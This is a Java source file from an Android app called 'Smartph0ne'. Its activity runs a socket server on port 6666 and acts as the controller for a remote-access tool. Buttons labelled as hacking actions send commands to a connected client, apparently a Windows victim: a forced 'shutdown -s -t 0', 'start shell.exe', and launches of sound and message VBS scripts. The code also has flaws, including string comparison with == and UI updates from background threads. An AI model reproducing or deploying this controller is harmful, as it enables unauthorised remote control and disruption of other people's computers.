package com.artiqk.smartph0ne;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

public class ConnectionActivity extends AppCompatActivity {
    private static Handler mainHandler = new Handler();
    private MediaPlayer mediaPlayer;
    private static Button powerBtn, soundBtn, msgBtn, shellBtn;
    private static TextView waitText;
    public static Socket client;
    public static boolean isClientConnected = false, isServerStarted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_connection);

        powerBtn = (Button) findViewById(R.id.powerButton);
        soundBtn = (Button) findViewById(R.id.soundButton);
        msgBtn   = (Button) findViewById(R.id.msgButton);
        shellBtn = (Button) findViewById(R.id.shellButton);

        textAnimation();
        startHacking();
        if(!isServerStarted) {
            ServerDaemon serverDaemon = new ServerDaemon(6666);
            serverDaemon.startServer();
            isServerStarted = true;
        }
    }

    public void playBeep() {
        mediaPlayer = (MediaPlayer) MediaPlayer.create(this, R.raw.beep);
        mediaPlayer.start();
    }

    public void openHackingActivity(String hackingActivity) {
        if (hackingActivity == "power") {
            Intent intent = new Intent(this, PowerActivity.class);
            startActivity(intent);
        }
        if (hackingActivity == "sound") {
            Intent intent = new Intent(this, SoundActivity.class);
            startActivity(intent);
        }
        if (hackingActivity == "msg") {
            Intent intent = new Intent(this, MessageActivity.class);
            startActivity(intent);
        }
        if (hackingActivity == "shell") {
            Intent intent = new Intent(this, ShellActivity.class);
            startActivity(intent);
        }
    }

    public void startHacking() {
        powerBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                playBeep();
                openHackingActivity("power");
            }
        });

        soundBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                playBeep();
                openHackingActivity("sound");
            }
        });

        msgBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                playBeep();
                openHackingActivity("msg");
            }
        });

        shellBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                playBeep();
                openHackingActivity("shell");
            }
        });
    }

    public void textAnimation() {
        waitText = (TextView) findViewById(R.id.waitingText);
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                while(true) {
                    if(!isClientConnected) {
                        waitText.setText("Listening.");
                        try {
                            Thread.sleep(600);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                        waitText.setText("Listening..");
                        try {
                            Thread.sleep(600);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                        waitText.setText("Listening...");
                        try {
                            Thread.sleep(600);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    } else {
                        waitText.setText(client.getInetAddress().toString().replace("/", ""));
                    }
                }
            }
        });
        t.start();
    }

    public class ServerDaemon {
        private ServerSocket sSocket;
        private InetAddress inetAddress;
        private int port;
        private boolean isRunning = true;

        ServerDaemon(int port){
            waitText = (TextView) findViewById(R.id.waitingText);
            this.port = port;
            try {
                sSocket = new ServerSocket(port);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        public void startServer() {
            Thread t = new Thread(new Runnable() {
                @Override
                public void run() {
                    while(isRunning) {
                        try {
                            Log.i("Smartph0ne", "Server is listening...");
                            client = sSocket.accept();
                            isClientConnected = true;
                            Log.i("Debug", "client connected!");
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
            t.start();
        }
    }

    public static class MayTheHackBegin implements Runnable {
        private Socket sock;
        private PrintWriter writer;
        private String cmd, command;

        MayTheHackBegin(Socket socket, String cmd) {
            this.sock = socket;
            this.cmd = cmd;
        }

        @Override
        public void run() {
            boolean connectionClosed = false;
            while(!sock.isClosed()) {
                try{
                    writer = new PrintWriter(sock.getOutputStream());

                    if(cmd == "power") {
                        command = "shutdown -s -t 0";
                    } else if (cmd == "sound") {
                        command = "start sound.vbs";
                    } else if (cmd == "msg") {
                        command = "start msg.vbs";
                    } else if(cmd == "shell") {
                        command = "start shell.exe";
                    }

                    writer.write(command);
                    writer.flush();
                    isClientConnected = false;

                    if(connectionClosed){
                        writer = null;
                        sock.close();
                        break;
                    }

                } catch (SocketException e) {
                    Log.i("ERROR", "Connection error");
                    break;
                } catch (IOException e) {
                    Log.i("ERROR", "Connection error");
                    e.printStackTrace();
                }
            }
        }
    }
}